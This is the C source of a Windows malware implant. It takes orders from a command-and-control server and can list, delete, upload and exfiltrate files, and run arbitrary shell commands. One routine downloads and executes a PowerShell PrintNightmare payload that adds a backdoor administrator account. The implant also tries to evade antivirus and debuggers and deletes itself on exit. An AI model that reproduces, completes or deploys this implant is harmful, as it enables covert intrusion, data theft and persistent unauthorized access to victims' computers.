#include "c2_comms.h"


// Global heap handle
HANDLE heap;
#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
#define Free(ptr) HeapFree(HEAP, 0, (ptr));

// Present working directory, globally accessible
char PWD[MAX_PATH + 1] = {0};

// Attempt to change the PWD to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {
    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        c2_log("PATH: %s   LEN: %d\n", path, len);
        memset(PWD, 0, MAX_PATH + 1);
        strncpy(PWD, path, len);
        PathAddBackslashA(PWD); // Append trailing \ to path if needed
        c2_log("PWD: %s\n", PWD);
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}


// Attempt to remove the given file
BOOL rm(char *path) {
    char abs_path[MAX_PATH + 1] = {0};

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", PWD, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    return DeleteFileA(path);
}


// Writes data in file at serverPath to file at clientPath
DWORD write(char* clientPath, char* serverPath) {
    HANDLE hFile;
    char* data;
    char abs_path[MAX_PATH + 1] = {0};

    // Convert relative path to absolute path
    if (clientPath[0] != 'C' || clientPath[1] != ':') {
        sprintf(abs_path, "%s\\%s", PWD, clientPath);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, clientPath);
    }

    hFile = CreateFileA(clientPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        c2_log("[!] Could not get handle to file");
        return 0;
    }

    // Allocate space for file data
    data = Malloc(100 * 1000);
    if (data == NULL) {
        CloseHandle(hFile);
        return 0;
    }

    // Get data to write. We send the name of the file we want in the format FILE:filename.txt
    // TODO: 100 Kb max file size rn
    char request[300];
    sprintf(request, "FILE:%s", serverPath);
    c2_send(request, strlen(request));
    int n = c2_recv(data, 100 * 1000);

    DWORD numWritten = 0;
    if (! WriteFile(hFile, data, n, &numWritten, NULL)) {
        CloseHandle(hFile);
        Free(data);
        return 0;
    }

    CloseHandle(hFile);
    Free(data);

    return numWritten;
}


// Write file + directory listing to out
// Note: Can handle 50 kB of text before crash. This is arbitrary, can be increased.
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH + 4];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer + append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    
    FindClose(h);
    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}
 

// Reads data from file given by path and sends it back to C2 server
int Exfil(char* path) {
    char abs_path[MAX_PATH + 1] = {0};
    DWORD numBytesRead = 0;
    DWORD numBytesSent = 0;
    LARGE_INTEGER fileSize;

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", PWD, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    // Open file
    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        numBytesSent = 0;
        goto end;
    }

    // Get file size
    int low = 0;
    low = GetFileSize(hFile, &fileSize.HighPart);
    fileSize.LowPart = low;

    // Allocate buffer on heap for the data
    char* out = (char*) Malloc(fileSize.QuadPart);
    if (out == NULL) {
        numBytesSent = 0;
        goto end;
    }

    // Read data
    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
    if (!res) {
        numBytesSent = 0;
        goto end;
    }
    numBytesSent = c2_exfil(out, numBytesRead);

end:
    Free(out);
    CloseHandle(hFile);
    return numBytesSent;
}



// Checks the registry to see if host is vulnerable to printer nightmare.
// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
int CheckForNightmare() {
    int vulnerable = 1;
    DWORD status;
    HKEY hKey = NULL;
    DWORD val;          // store registry values here 
    int size = 4;       // size of DWORD, needed for RegGetValue

    // Open handle
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
    if (status == ERROR_FILE_NOT_FOUND) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Read first value
    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Need to check both registry values
    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

end:
    if (hKey) { RegCloseKey(hKey); }
    return vulnerable;
}



// Creates a file in the present working directory and writes the printer nightmare powershell script to it.
// Returns NULL on failure, and the path to the script on success.
// TODO: name the payload something less sus than "script.ps1"
char* DownloadScript() {
    char* payload_path;
    char* payload_data;

    // Allocate buffer for payload path
    payload_path = Malloc(2 * MAX_PATH);
    if (payload_path == NULL) {
        return NULL;
    }

    // Allocate buffer for payload data
    payload_data = Malloc(500*1000); // Allocate 500 Kb to be safe
    if (payload_data == NULL) {
        Free(payload_path);
        return NULL;
    }

    // Receive payload
    c2_send("SCRIPT", 6);
    int len = c2_recv(payload_data, 500*1000);
    if (len <= 0) {
        Free(payload_data);
        Free(payload_path);
        return NULL;
    }

    // Create file for payload to be written to
    strcpy(payload_path, PWD);
    strcat(payload_path, "\\script.ps1");
    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Free(payload_data);
        Free(payload_path);
        return NULL;
    }

    // Write payload
    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
        Free(payload_data);
        Free(payload_path);
        CloseHandle(hFile);
        DeleteFile(payload_path);
        return NULL;
    }

    Free(payload_data);
    CloseHandle(hFile);
    return payload_path;
}



// Attempts to add a backdoor admin account using printer nightmare exploit.
// Works by downloading and executing a powershell script.
DWORD BackDoor() {
    char* script_path;
    STARTUPINFO startInfo;
    PROCESS_INFORMATION procInfo;
    DWORD ret = 0;

    // Set up process structures
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);

    // Check registry first
    int vulnerable  = CheckForNightmare();
    if (vulnerable == 0) {
        c2_log("Target not vulnerable", 21);
        ret = -1;
        goto end;
    }
    if (vulnerable == -1) {
        c2_log("ERROR: Could not check registry", 31);
        ret = -1;
        goto end;
    }

    // Download script
    script_path = DownloadScript();
    if (script_path == NULL) {
        c2_log("ERROR: Could not download script", 32);
        ret = -1;
        goto end;
    }
    c2_log("Script path: %s\n", script_path);

    // Execute the powershell script
    ret = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
    if (!ret) {
        c2_log("Spawning powershell failed\n");
        ret = -1;
        goto end;
    }
    WaitForSingleObject(procInfo.hProcess, INFINITE);
    c2_log("[+] Script ran successfully\n");
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);
    ret = 0;

end:
    if (script_path) {
        DeleteFile(script_path);
        Free(script_path);
    }
    return ret;
}


// Execute a shell command by spawning cmd.exe
// Based on https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
DWORD Exec(char* command) {
    char fullCommand[2048];
    char* output = NULL;
    DWORD bytesRead = 0;

    STARTUPINFO startInfo;
    PROCESS_INFORMATION procInfo;
    HANDLE pipe_read = NULL;
    HANDLE pipe_write = NULL;
    SECURITY_ATTRIBUTES saAttr;

    DWORD status;
    DWORD ret = 0;

    // Create pipe to capture output
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&pipe_read, &pipe_write, &saAttr, 0)) {
        c2_log("[!] CreatePipe failed\n");
        return -1;
    }

    // Set up process structures
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);
    startInfo.hStdError = pipe_write;
    startInfo.hStdOutput = pipe_write;
    startInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Execute
    sprintf(fullCommand, "cmd.exe /C %s", command);
    status = CreateProcess(NULL, fullCommand, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo);
    if (!status) {
        c2_log("[!] Exec failed\n");
        CloseHandle(pipe_write);
        CloseHandle(pipe_read);
        return -1;
    }
    c2_log("[+] Exec success\n");
    WaitForSingleObject(procInfo.hProcess, INFINITE);
    
    // Close write end of pipe (we only need read access)
    CloseHandle(pipe_write);
    pipe_write = NULL;

    // Allocate memory for output
    output = (char*) Malloc(100 * 1000); // 100 Kb
    ReadFile(pipe_read, output, 100*1000, &bytesRead, NULL);

    // Send to server
    c2_send(output, bytesRead);

    // Cleanup
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);
    CloseHandle(pipe_read);

    return 0;
}


// Ends the process and deletes the binary
void DeleteSelf() {
    char path[MAX_PATH];
    char command[50 + MAX_PATH];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Get path to executable
    GetModuleFileName(NULL, path, MAX_PATH);

    // Command to execute (wait for 3 seconds to give time for parent to exit, then delete binary)
    sprintf(command, "cmd /C timeout 3 >nul && del \"%s\"", path);

    // Process setup
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    CreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    exit(0);
}





// Debug build: cl implant.c /Fe:implant.exe /DDEBUG /DEBUG /Zi
// Final build: cl implant.c /Os /Fe:implant.exe /Zi
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};

    // Sleep to bypass AV scan
    Sleep(5000);

    // Check if a debugger is attached
    if (IsDebuggerPresent()) {
        return 0;
    }

    // Network setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] Error in comms setup\n");
        TearDownComms();
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");

    // Other setup
    heap = GetProcessHeap();
    GetCurrentDirectory(_MAX_PATH, PWD);

    
    c2_send("READY", 5); // we need an initial send so we can get a corresponding response
    while (1) {
        // Recv data
        int n = c2_recv(buffer, 1024);
        if (n <= 0) {
            c2_log("[!] Didn't receive any data!\n");
            continue;
        }


        c2_log("RECV: %s\n", buffer);


        // Main logic of implant
        // Note: to maintain synchronization between requests and responses, always need to send something back to server
        
        // To delete binary after exit, we spawn a new child process
        if (strncmp(buffer, "exit", 4) == 0) {
            TearDownComms();
            DeleteSelf();
            break;
        }

        else if (strncmp(buffer, "pwd", 3) == 0) {
            c2_send(PWD, strlen(PWD));
        }

        else if (strncmp(buffer, "rm ", 3) == 0) {
            if(rm(buffer + 3)) {
                c2_send("[+] Success", 11);
            }
            else {
                c2_send("[!] Failed", 10);
            }
        }

        else if (strncmp(buffer, "write ", 6) == 0) {

            // Find index of arguments in buffer
            int idx1 = 6;
            int idx2;
            for(idx2 = 6; idx2 < n; idx2++) {
                if (buffer[idx2] == ' ') {
                    buffer[idx2] = '\x00'; // put \x00 in middle of string to terminate first arg
                    idx2++;
                    break;
                }
            }

            int num = write(buffer + idx1, buffer + idx2);
            if (num == 0) {
                c2_send("[!] Error", 9);
            }
            else {
                c2_send("[+] Success", 11);
            }
        }

        else if(strncmp(buffer, "cd ", 3) == 0 && n >= 4) {
            if (change_dir(buffer + 3, n - 3)) { // buffer + 3 is start of arg passed to cd
                c2_send(PWD, strlen(PWD));
            }
            else { c2_send("[!] Invalid dir", 15); }
        }

        else if(strncmp(buffer, "ls", 2) == 0) {
            char* listing = Malloc(50 * 1000); // 50 kB
            if (n == 2)
                status = ls(PWD, listing);
            else if (n >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(listing, strlen(listing));
            }
            else {
                c2_send("[!] Error", 9);
            }
            Free(listing);
        }

        else if(strncmp(buffer, "exfil ", 6) == 0) {
            if (n >= 7) {
                status = Exfil(buffer + 6);
                if (status > 0) { c2_send("OK", 2); }
                else { c2_send("[!] Error", 9); }
            }
            else {
                c2_send("[!] No arg", 10);
            }
        }

        else if (strncmp(buffer, "check", 5) == 0) {
            status = CheckForNightmare();
            if (status == 1) { c2_send("[+] Host vulnerable", 19); }
            else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
            else { c2_send("[!] Error", 9); }
        }

        else if (strncmp(buffer, "backdoor", 8) == 0) {
            status = BackDoor();
            if (status == 0) { c2_send("[+] Sucess", 10); }
            else { c2_send("[!] Error", 9); }
        }

        else if (strncmp(buffer, "exec ", 5) == 0) {
            status = Exec(buffer + 5);
            if (status != 0) { c2_send("[!] Error", 9); }
        }

        else {
            c2_send("[!] Invalid command", 19);
        }

        
        
        // Clear buffer
        memset(buffer, 0, 1024);
    }
    


    TearDownComms();
    return 0;
}
